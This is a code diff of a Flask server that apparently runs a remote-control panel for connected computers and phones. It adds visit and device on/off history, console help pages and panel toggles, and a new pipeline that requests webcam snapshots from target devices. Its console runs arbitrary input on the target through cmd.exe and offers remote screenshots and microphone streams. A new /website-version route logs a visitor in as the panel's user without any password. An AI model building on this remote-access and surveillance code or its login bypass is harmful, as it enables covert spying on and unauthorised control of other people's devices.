+                    sendSingleFrame(data.snapshot_request);
+                }
             }
         } catch (error) {
         }
@@ -7808,7 +8172,7 @@ def website_client_ip():
     return (request.remote_addr or "unknown")[:60]
 
 
-def describe_user_agent(agent):
+def split_user_agent(agent):
 
     agent = agent or ""
 
@@ -7838,7 +8202,125 @@ def describe_user_agent(agent):
     else:
         system = "Unknown OS"
 
+    return system, browser
+
+
+def describe_user_agent(agent):
+
+    system, browser = split_user_agent(agent)
+
     return f"{browser} on {system}"
+
+
+def close_website_history(sid, now):
+
+    for record in reversed(website_history):
+        if record["sid"] == sid and record["left"] is None:
+            record["left"] = now
+            return
+
+
+def prune_history(now):
+
+    while website_history and now - website_history[0]["entered"] > HISTORY_SECONDS:
+        website_history.popleft()
+
+    while device_history and now - device_history[0]["on"] > HISTORY_SECONDS:
+        device_history.popleft()
+
+
+def record_device_online(name, now):
+
+    for record in reversed(device_history):
+        if record["name"] == name and record["off"] is None:
+            return
+
+    device_history.append({"name": name, "on": now, "off": None})
+    prune_history(now)
+
+
+def record_device_offline(name, when):
+
+    for record in reversed(device_history):
+        if record["name"] == name and record["off"] is None:
+            record["off"] = when
+            return
+
+
+def close_idle_website_history(now):
+
+    open_sessions = {}
+
+    for record in reversed(website_history):
+        if record["left"] is None:
+            open_sessions.setdefault(record["sid"], record)
+
+    for sid, record in open_sessions.items():
+        if now - record["seen"] > WEBSITE_IDLE_SECONDS:
+            record["left"] = record["seen"]
+
+
+def describe_website_history(now):
+
+    prune_history(now)
+
+    rows = [
+        record for record in website_history
+        if now - record["entered"] <= HISTORY_SECONDS
+    ]
+
+    if not rows:
+        return "No website entries in the last 7 days."
+
+    lines = ["WEBSITE ENTRIES (LAST 7 DAYS)", ""]
+
+    for record in reversed(rows):
+
+        left = (
+            time.strftime("%Y-%m-%d %H:%M", time.localtime(record["left"]))
+            if record["left"]
+            else "online now"
+        )
+
+        lines.append(
+            time.strftime("%Y-%m-%d %H:%M", time.localtime(record["entered"]))
+            + "  " + record["device"].ljust(10)
+            + "  " + record["browser"].ljust(8)
+            + "  " + left
+        )
+
+    return "\n".join(lines)
+
+
+def describe_device_history(now):
+
+    prune_history(now)
+
+    rows = [
+        record for record in device_history
+        if now - record["on"] <= HISTORY_SECONDS
+    ]
+
+    if not rows:
+        return "No device activity in the last 7 days."
+
+    lines = ["DEVICE ON/OFF HISTORY (LAST 7 DAYS)", ""]
+
+    for record in reversed(rows):
+
+        left = (
+            time.strftime("%Y-%m-%d %H:%M", time.localtime(record["off"]))
+            if record["off"]
+            else "online now"
+        )
+
+        lines.append(
+            record["name"].ljust(24)
+            + time.strftime("%Y-%m-%d %H:%M", time.localtime(record["on"]))
+            + "  " + left
+        )
+
+    return "\n".join(lines)
 
 
 def prune_website_sessions(now):
@@ -7862,6 +8344,8 @@ def prune_website_sessions(now):
         website_sessions.pop(oldest, None)
         site_effects.pop(oldest, None)
 
+    close_idle_website_history(now)
+
 
 def record_website_session():
 
@@ -7876,6 +8360,10 @@ def record_website_session():
 
         entry = website_sessions.get(sid)
 
+        device, browser = split_user_agent(
+            request.headers.get("User-Agent", "")
+        )
+
         if entry is None:
 
             path = request.path
@@ -7886,19 +8374,49 @@ def record_website_session():
             website_sessions[sid] = {
                 "id": sid,
                 "ip": website_client_ip(),
-                "agent": describe_user_agent(request.headers.get("User-Agent", "")),
+                "agent": f"{browser} on {device}",
                 "signed_in": now,
                 "last_seen": now,
                 "path": path,
             }
 
+            website_history.append({
+                "sid": sid,
+                "entered": now,
+                "seen": now,
+                "left": None,
+                "ip": website_client_ip(),
+                "device": device,
+                "browser": browser,
+            })
+
             prune_website_sessions(now)
+            prune_history(now)
 
             return
 
         entry["last_seen"] = now
         entry["ip"] = website_client_ip()
-        entry["agent"] = describe_user_agent(request.headers.get("User-Agent", ""))
+        entry["agent"] = f"{browser} on {device}"
+
+        for record in reversed(website_history):
+            if record["sid"] == sid:
+                if record["left"] is not None:
+                    website_history.append({
+                        "sid": sid,
+                        "entered": now,
+                        "seen": now,
+                        "left": None,
+                        "ip": entry["ip"],
+                        "device": device,
+                        "browser": browser,
+                    })
+                    prune_history(now)
+                else:
+                    record["seen"] = now
+                    record["device"] = device
+                    record["browser"] = browser
+                break
 
         if request.method == "GET" and not request.path.startswith("/api/"):
             entry["path"] = request.path
@@ -8549,6 +9067,107 @@ def set_website_effect(operation, argument):
 
 
 # ==================================================
+# CONSOLE HELP AND PANEL ACCESS
+# ==================================================
+
+WEBSITE_HELP = (
+    "WEBSITE COMMANDS\n"
+    "----------------\n"
+    "help             Website commands (type help again for device commands)\n"
+    "entries          All website entries from the last 7 days\n"
+    "power            Device on/off history from the last 7 days\n"
+    "panels           List the function panels and their state\n"
+    "enable <panel>   Show a function panel in the sidebar\n"
+    "disable <panel>  Hide a function panel again\n"
+    "\n"
+    "WEBSITE USERS\n"
+    "view-users       Show who is using the website\n"
+    "user-block <user> [seconds]  Temporary block (default 60s)\n"
+    "user-permban <user>          Block until unbanned\n"
+    "user-unban <user>            Lift a temporary or permanent ban\n"
+    "bans             List temporary and permanent bans\n"
+    "permbans         List permanent bans\n"
+    "\n"
+    "WEBSITE UI (user = number or code; all = every user)\n"
+    "theme <user|all> <name>      pink, green, purple, red, blue,\n"
+    "                             yellow, dark, light, mono, hacker,\n"
+    "                             default\n"
+    "design <user|all> true|false Website design on/off\n"
+    "                             (default off = plain console look)\n"
+    "dyslexic <user|all> true|false   Dyslexic text styling\n"
+    "flip <user|all> true|false       Turn the page upside down\n"
+    "mirror <user|all> true|false     Mirror the page\n"
+    "blur <user|all> true|false       Blur the page\n"
+    "shake <user|all> true|false      Shake the page\n"
+    "rainbow <user|all> true|false    Animated rainbow background\n"
+    "caps <user|all> true|false       Force all text to uppercase\n"
+    "spin <user|all> true|false       Slowly spin the page\n"
+    "invert <user|all> true|false     Invert all colors\n"
+    "Per-user settings override global ones.\n"
+    "\n"
+    "Type help again for the device commands."
+)
+
+DEVICE_HELP = (
+    "DEVICE COMMANDS\n"
+    "---------------\n"
+    "help             Device commands (type help again for website commands)\n"
+    "status           Show connection status\n"
+    "pwd              Show the shared root folder\n"
+    "ls [folder]      List folders in the cached directory tree\n"
+    "screenshot       Request a remote screenshot\n"
+    "python-setup     Check for Python and install it if missing\n"
+    "\n"
+    "Any other input is executed on the target computer\n"
+    "through cmd.exe. Use cd to change its working directory.\n"
+    "\n"
+    "Type help again for the website commands."
+)
+
+
+def describe_panels():
+
+    lines = ["FUNCTION PANELS", ""]
+
+    for name in PANELS:
+        state = "shown" if name in enabled_panels else "hidden"
+        lines.append(name.ljust(12) + state)
+
+    lines.append("")
+    lines.append("Use enable <panel> to add one to the sidebar.")
+
+    return "\n".join(lines)
+
+
+def set_panel_access(operation, argument):
+
+    parts = (argument or "").split()
+
+    if not parts:
+        return (
+            f"Usage: {operation} <panel>\n"
+            "Panels: " + ", ".join(PANELS)
+        )
+
+    token = parts[0].lstrip("#").lower()
+    name = PANEL_ALIASES.get(token, token if token in PANELS else "")
+
+    if not name:
+        return "Unknown panel '" + parts[0] + "'. Choose: " + ", ".join(PANELS)
+
+    if operation == "enable":
+        enabled_panels.add(name)
+        return name + " is now shown in the sidebar."
+
+    if name == "console":
+        return "The Console panel always stays visible."
+
+    enabled_panels.discard(name)
+
+    return name + " is hidden from the sidebar."
+
+
+# ==================================================
 # LOGIN ROUTES
 # ==================================================
 
@@ -8594,6 +9213,25 @@ def login():
     )
 
 
+@app.route("/website-version")
+def website_version():
+
+    # The login page's "website version" button opens the mobile site
+    # without asking for the username or password.
+    next_url = normalize_next(request.values.get("next", "")) or "/mobile"
+
+    session.clear()
+    session.permanent = True
+    session["user"] = USERNAME
+    session["website_version"] = True
+
+    record_website_session()
+
+    add_log("info", "Website version opened without sign-in.")
+
+    return redirect(next_url)
+
+
 @app.route("/logout")
 def logout():
 
@@ -8602,6 +9240,7 @@ def logout():
     if sid:
         with session_lock:
             website_sessions.pop(sid, None)
+            close_website_history(sid, time.time())
 
     session.clear()
 
@@ -8711,40 +9350,50 @@ def console_command():
 
         if operation == "help":
 
+            viewer = session.get("sid") or "-"
+            now_help = time.time()
+            stage = help_stage.get(viewer)
+
+            if not stage or now_help - stage["time"] > 300:
+                stage = {"count": 0, "time": now_help}
+                help_stage[viewer] = stage
+
             output = (
-                "AVAILABLE COMMANDS\n"
-                "------------------\n"
-                "help             Show available commands\n"
-                "status           Show connection status\n"
-                "pwd              Show the shared root folder\n"
-                "ls [folder]      List folders in the cached directory tree\n"
-                "screenshot       Request a remote screenshot\n"
-                "python-setup     Check for Python and install it if missing\n"
-                "\n"
-                "WEBSITE USERS\n"
-                "view-users       Show who is using the website\n"
-                "user-block <user> [seconds]  Temporary block (default 60s)\n"
-                "user-permban <user>          Block until unbanned\n"
-                "user-unban <user>            Lift a temporary or permanent ban\n"
-                "bans             List temporary and permanent bans\n"
-                "permbans         List permanent bans\n"
-                "\n"
-                "WEBSITE UI (user = number or code; all = every user)\n"
-                "theme <user|all> <name>      pink, green, purple, red, blue,\n"
-                "                             yellow, dark, light, mono, default\n"
-                "dyslexic <user|all> true|false   Dyslexic text styling\n"
-                "flip <user|all> true|false       Turn the page upside down\n"
-                "mirror <user|all> true|false     Mirror the page\n"
-                "blur <user|all> true|false       Blur the page\n"
-                "shake <user|all> true|false      Shake the page\n"
-                "rainbow <user|all> true|false    Animated rainbow background\n"
-                "caps <user|all> true|false       Force all text to uppercase\n"
-                "spin <user|all> true|false       Slowly spin the page\n"
-                "invert <user|all> true|false     Invert all colors\n"
-                "Per-user settings override global ones.\n"
-                "\n"
-                "Any other input is executed on the target computer\n"
-                "through cmd.exe. Use cd to change its working directory."
+                WEBSITE_HELP
+                if stage["count"] % 2 == 0
+                else DEVICE_HELP
+            )
+
+            stage["count"] += 1
+            stage["time"] = now_help
+
+        elif operation in (
+            "entries",
+            "website-entries",
+            "visits",
+            "website-history"
+        ):
+
+            output = describe_website_history(time.time())
+
+        elif operation in (
+            "power",
+            "device-history",
+            "onoff",
+            "device-history-7d"
+        ):
+
+            output = describe_device_history(time.time())
+
+        elif operation in ("panels", "functions"):
+
+            output = describe_panels()
+
+        elif operation in ("enable", "disable", "show", "hide"):
+
+            output = set_panel_access(
+                "enable" if operation in ("enable", "show") else "disable",
+                argument
             )
 
         elif operation == "status":
@@ -9104,6 +9753,8 @@ def sync():
             queue.Queue()
         )
 
+        record_device_online(assigned_name, now)
+
     if connected:
         add_log(
             "success",
@@ -9147,7 +9798,8 @@ def get_clients():
 
     return jsonify({
         "clients": result,
-        "effects": current_site_effects()
+        "effects": current_site_effects(),
+        "panels": sorted(enabled_panels)
     })
 
 
@@ -10187,6 +10839,133 @@ def camera_frame(name):
     return response
 
 
+@app.route("/api/camera/snapshot", methods=["POST"])
+@require_auth
+def request_camera_snapshot():
+
+    data = request.get_json(silent=True) or {}
+
+    name = data.get("name")
+
+    if not name:
+        return jsonify({"error": "Missing computer name"}), 400
+
+    with lock:
+
+        client = clients.get(name)
+
+        if not client:
+            return jsonify({"error": "Computer not found"}), 404
+
+        if time.time() - client["last_seen"] > 60:
+            return jsonify({"error": "Computer is offline"}), 404
+
+        now = time.time()
+
+        for request_key, snapshot in list(camera_snapshots.items()):
+
+            if now - snapshot["timestamp"] > 120:
+                camera_snapshots.pop(request_key, None)
+
+        mobile = client.get("kind") == "mobile"
+
+        request_id = uuid.uuid4().hex
+
+        camera_snapshots[request_id] = {
+            "name": name,
+            "frame": None,
+            "error": "",
+            "timestamp": now,
+            "created": now,
+            "mobile": mobile,
+            "claimed": False
+        }
+
+        if not mobile:
+            client_actions.setdefault(name, queue.Queue()).put({
+                "action": "camera_snapshot",
+                "request_id": request_id
+            })
+
+    return jsonify({"success": True, "request_id": request_id})
+
+
+@app.route("/upload-camera-snapshot", methods=["POST"])
+@require_auth
+def upload_camera_snapshot():
+
+    name = request.form.get("name")
+    request_id = request.form.get("request_id")
+    error_text = request.form.get("error", "")
+    uploaded_file = request.files.get("frame")
+
+    if not request_id:
+        return jsonify({"error": "Missing request id"}), 400
+
+    with lock:
+
+        snapshot = camera_snapshots.get(request_id)
+
+        if not snapshot:
+            return jsonify({"error": "Unknown snapshot request"}), 404
+
+        if name and snapshot["name"] != name:
+            return jsonify({"error": "Wrong computer"}), 400
+
+        if error_text:
+
+            snapshot["error"] = error_text[:500]
+
+            return jsonify({"success": True})
+
+        if not uploaded_file:
+            return jsonify({"error": "Missing camera frame"}), 400
+
+        frame_data = uploaded_file.read(MAX_CAMERA_FRAME_SIZE + 1)
+
+        if len(frame_data) > MAX_CAMERA_FRAME_SIZE:
+            return jsonify({"error": "Camera frame is too large."}), 413
+
+        if not frame_data.startswith(b"\xff\xd8"):
+            return jsonify({"error": "Invalid JPEG frame."}), 400
+
+        snapshot["frame"] = frame_data
+        snapshot["timestamp"] = time.time()
+
+    return jsonify({"success": True})
+
+
+@app.route("/api/camera/snapshot/<request_id>")
+@require_auth
+def camera_snapshot(request_id):
+
+    with lock:
+
+        snapshot = camera_snapshots.get(request_id)
+
+        if not snapshot:
+            return jsonify({"error": "Snapshot not found."}), 404
+
+        if snapshot["error"]:
+            return jsonify({"error": snapshot["error"]}), 404
+
+        frame_data = snapshot["frame"]
+
+    if not frame_data:
+        return jsonify({"status": "pending"}), 202
+
+    response = send_file(
+        io.BytesIO(frame_data),
+        mimetype="image/jpeg"
+    )
+
+    response.headers["Cache-Control"] = (
+        "no-store, no-cache, must-revalidate, max-age=0"
+    )
+
+    return response
+
+
 # ==================================================
 # MOBILE WEB CLIENT
 # ==================================================
@@ -10245,6 +11024,8 @@ def register_mobile():
 
             client_actions.setdefault(name, queue.Queue())
 
+            record_device_online(name, now)
+
             add_log("success", f"Mobile device connected: {name}")
 
     return jsonify({"success": True, "name": name, "kind": "mobile"})
@@ -10295,11 +11076,29 @@ def mobile_state():
         camera = camera_streams.get(name)
         mic = mic_streams.get(name)
 
+        now = time.time()
+        snapshot_request = ""
+
+        for request_id, snapshot in camera_snapshots.items():
+
+            if (
+                snapshot.get("mobile")
+                and snapshot["name"] == name
+                and snapshot["frame"] is None
+                and not snapshot.get("error")
+                and not snapshot.get("claimed")
+                and now - snapshot.get("created", now) <= 30
+            ):
+                snapshot["claimed"] = True
+                snapshot_request = request_id
+                break
+
         result = {
             "camera": bool(camera and camera["active"]),
             "microphone": bool(mic and mic["active"]),
             "photo_request": bool(client.get("photo_request")),
-            "photos": len(mobile_photos.get(name) or ())
+            "photos": len(mobile_photos.get(name) or ()),
+            "snapshot_request": snapshot_request
         }
 
     result["effects"] = current_site_effects()
